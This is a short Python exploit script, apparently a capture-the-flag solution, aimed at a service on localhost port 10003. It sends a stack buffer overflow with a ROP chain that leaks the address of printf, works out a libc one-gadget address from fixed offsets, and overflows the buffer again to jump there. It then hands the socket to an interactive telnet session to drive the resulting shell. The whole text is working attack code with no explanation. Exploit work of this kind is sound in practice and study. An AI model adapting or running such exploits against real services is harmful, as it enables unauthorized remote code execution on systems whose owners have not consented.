import socket, time, struct, telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 10003))

time.sleep(1)

print(s.recv(1024))

payload = b'a' * 0x20 + b'a' * 0x8 
payload += (0x400873).to_bytes(8, 'little')
payload += (0x601020).to_bytes(8, 'little')
payload += (0x4005d0).to_bytes(8, 'little')
payload += (0x400782).to_bytes(8, 'little')
payload += b'\n'

s.sendall(payload)

time.sleep(1)
d = s.recv(1024)
print(d)

addr_of_printf = struct.unpack('<Q', d.split(b'\n')[1].ljust(8, b'\0'))[0]
print('printf: %x'%addr_of_printf)

addr_binsh = addr_of_printf - 0x64e80 + 0x4f2c5

ret2main = b'a' * 0x28 + addr_binsh.to_bytes(8, 'little') + b'\n'

s.sendall(ret2main)

t = telnetlib.Telnet()
t.sock = s
t.interact()
